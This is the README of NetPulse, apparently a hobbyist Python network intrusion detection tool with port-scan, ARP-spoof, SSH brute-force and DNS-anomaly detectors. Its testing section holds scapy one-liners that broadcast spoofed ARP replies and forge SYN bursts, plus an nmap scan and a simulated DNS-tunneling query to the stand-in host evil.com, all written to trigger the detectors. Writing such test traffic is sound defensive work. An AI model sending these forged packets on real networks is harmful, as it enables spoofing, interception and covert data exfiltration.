# 🛡️ NetPulse

> Real-time network intrusion detection system with live web dashboard and terminal UI.

![Python](https://img.shields.io/badge/Python-3.12+-blue?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)
![Platform](https://img.shields.io/badge/Platform-Linux-orange?style=flat-square)

NetPulse is a self-hosted network anomaly detection system built from scratch in Python. It captures live traffic on your network interface, runs four independent detection engines simultaneously, and surfaces alerts through both a real-time web dashboard and a terminal UI — with every alert logged to disk in ML-ready JSONL format.

Built as a portfolio project to demonstrate practical security engineering, packet analysis, and full-stack Python development.

---

## ✨ Features

| Detection Engine | What It Catches | Severity |
|-----------------|-----------------|----------|
| 🔍 Port Scan | SYN-based port sweeps, sequential scans | HIGH |
| 🎭 ARP Spoof | MAC address changes for known IPs (MITM) | CRITICAL |
| 🔐 SSH Brute Force | Rapid connection attempts + auth log parsing | HIGH/CRITICAL |
| 🌐 DNS Anomaly | Tunneling, high query rates, suspicious TLDs | LOW/HIGH |

- **Dual UI** — Browser dashboard (Flask + SocketIO) and terminal TUI (Textual)
- **Real-time alerts** — WebSocket push, no polling, zero delay
- **Structured logging** — JSONL format, rotating at 5MB, 3 file history
- **ML-ready** — Modular detector design, every alert logged for future model training
- **Runs on real traffic** — Tested on live home server, catches real internet scanners

---

## 🏗️ Architecture

Network Interface (wlp1s0)
│
▼
PacketSniffer          ← single capture loop, background thread
│
├──▶ PortScanDetector      ← sliding window, SYN counting
├──▶ ARPSpoofDetector      ← IP→MAC trust table
├──▶ SSHBruteForceDetector ← dual: log tail + packet level
└──▶ DNSAnomalyDetector    ← rate + entropy + TLD checks
│
▼
Alert object
│
┌─────────┴─────────┐
▼                   ▼
log_alert()          on_alert()
logs/alerts.json     Web Dashboard (SocketIO)
JSONL format         or Terminal TUI

## 📁 Project Structure

```
netpulse/
├── main.py                    # Entry point
├── config.py                  # All thresholds and settings
├── fake_alerts.py             # Demo mode for portfolio
├── sniffer/
│   └── capture.py             # Packet capture engine
├── detectors/
│   ├── port_scan.py           # Port sweep detection
│   ├── arp_spoof.py           # ARP poisoning detection
│   ├── ssh_bruteforce.py      # SSH attack detection
│   └── dns_anomaly.py         # DNS anomaly detection
├── utils/
│   ├── alert.py               # Alert dataclass + Severity enum
│   └── logger.py              # Rotating JSONL file logger
├── web/
│   ├── app.py                 # Flask + SocketIO server
│   └── templates/index.html   # Dashboard UI
├── tui/
│   └── app.py                 # Textual terminal UI
└── logs/                      # Alert logs (gitignored)
```

---

## 🚀 Installation

### Requirements
- Ubuntu/Debian Linux
- Python 3.10+
- Root privileges (required for raw packet capture)

### Setup

```bash
# Clone the repo
git clone https://github.com/YOUR_USERNAME/netpulse.git
cd netpulse

# Create virtual environment
python3 -m venv netpulse-env
source netpulse-env/bin/activate

# Install dependencies
pip install scapy flask flask-socketio eventlet textual

# Configure
nano config.py
```

Find your network interface:
```bash
ip link show
# Look for the interface with state UP
# Common names: eth0, wlp1s0, enp3s0
```

---

## ⚙️ Configuration

All settings live in `config.py`:

```python
INTERFACE = "wlp1s0"         # Your network interface

# Port scan
PORT_SCAN_WINDOW = 10        # seconds
PORT_SCAN_THRESHOLD = 15     # unique ports before alert

# SSH brute force
SSH_PORT = 22                # change if using non-standard port
SSH_ATTEMPT_WINDOW = 60      # seconds
SSH_ATTEMPT_THRESHOLD = 5    # attempts before alert

# DNS anomaly
DNS_QUERY_THRESHOLD = 50     # queries per minute
DNS_LONG_SUBDOMAIN_LEN = 35  # chars before flagging as tunnel
DNS_SUSPICIOUS_TLDS = [".xyz", ".top", ".tk", ".ml", ".ga", ".cf"]
```

---

## 🖥️ Running

**Web dashboard** — open `http://YOUR_SERVER_IP:5000` in browser:
```bash
sudo netpulse-env/bin/python3 main.py --mode web
```

**Terminal UI:**
```bash
sudo netpulse-env/bin/python3 main.py --mode tui
```

**Demo mode** — streams fake alerts without live traffic:
```bash
sudo netpulse-env/bin/python3 fake_alerts.py
```

---

## 🧪 Testing Each Detector

### Port Scan
```bash
# From another machine on your network
nmap -sS YOUR_SERVER_IP -p 1-100
```

### ARP Spoof
```bash
sudo netpulse-env/bin/python3 -c "
from scapy.layers.l2 import ARP, Ether
from scapy.all import sendp
sendp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op=2, psrc='192.168.0.50', hwsrc='aa:bb:cc:dd:ee:11'), iface='wlp1s0')
sendp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op=2, psrc='192.168.0.50', hwsrc='ff:ee:dd:cc:bb:aa'), iface='wlp1s0')
"
```

### SSH Brute Force
```bash
sudo netpulse-env/bin/python3 -c "
from scapy.layers.inet import IP, TCP
from scapy.all import sendp
from scapy.layers.l2 import Ether
for i in range(10):
    sendp(Ether() / IP(dst='YOUR_SERVER_IP', src='10.10.10.99') / TCP(dport=YOUR_SSH_PORT, flags='S'), iface='wlp1s0', verbose=False)
"
```

### DNS Anomaly
```bash
# Suspicious TLD
dig malware.xyz

# DNS tunneling simulation
sudo netpulse-env/bin/python3 -c "
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR
from scapy.all import sendp
from scapy.layers.l2 import Ether
pkt = Ether() / IP(src='192.168.0.100', dst='8.8.8.8') / UDP(sport=12345, dport=53) / DNS(rd=1, qd=DNSQR(qname='aGVsbG93b3JsZHRoaXNpc2Ruc3R1bm5lbGluZw.evil.com'))
sendp(pkt, iface='wlp1s0', verbose=False)
"
```

---

## 📊 Alert Format

Every alert is written to `logs/alerts.json` as a JSONL record:

```json
{
  "id": "4f1c36b1",
  "timestamp": "2026-06-08T21:40:12.238604",
  "detector": "PortScan",
  "severity": "HIGH",
  "message": "Port scan detected: 15 unique ports in 10s",
  "src_ip": "192.168.0.100",
  "dst_ip": "192.168.0.111",
  "extra": {"ports_seen": [21, 22, 23, 25, 80]}
}
```

---

## 🔮 ML Upgrade Path

Each detector in `detectors/` exposes a clean `analyze(packet) -> Alert | None` interface. The rule-based threshold logic is isolated and straightforward to replace with a trained model.

**Phase 1 (current)** — Rule-based:
```python
if len(unique_ports) >= THRESHOLD:
    return Alert(...)
```

**Phase 2 (planned)** — ML-based:
```python
features = extract_features(packet, self._activity)
if model.predict([features])[0] == 1:
    return Alert(...)
```

The alert pipeline, logging, and both UIs stay completely unchanged. Candidate models:

- **Port Scan / SSH** — Isolation Forest on connection rate features
- **DNS Anomaly** — Random Forest on (query_rate, entropy, subdomain_length)
- **ARP Spoof** — One-class SVM on ARP table change frequency

Training data is already being collected — every alert in `logs/alerts.json` is a labeled data point.

---

## 🔍 Real-World Discovery

During development, NetPulse caught a real internet scanner hitting the server's port 8080:

```
IP:       185.16.39.146
Hostname: play23.juventusfcfans.org.uk
Location: Warsaw, Poland
ISP:      MEVSPACE sp. z o.o. (bulletproof hosting provider)
```

This led to discovering that Docker bypasses UFW firewall rules via direct iptables manipulation — a common misconfiguration on self-hosted servers. The server's firewall was hardened as a result.

---

## 📝 License

MIT — Hello! Use this may be!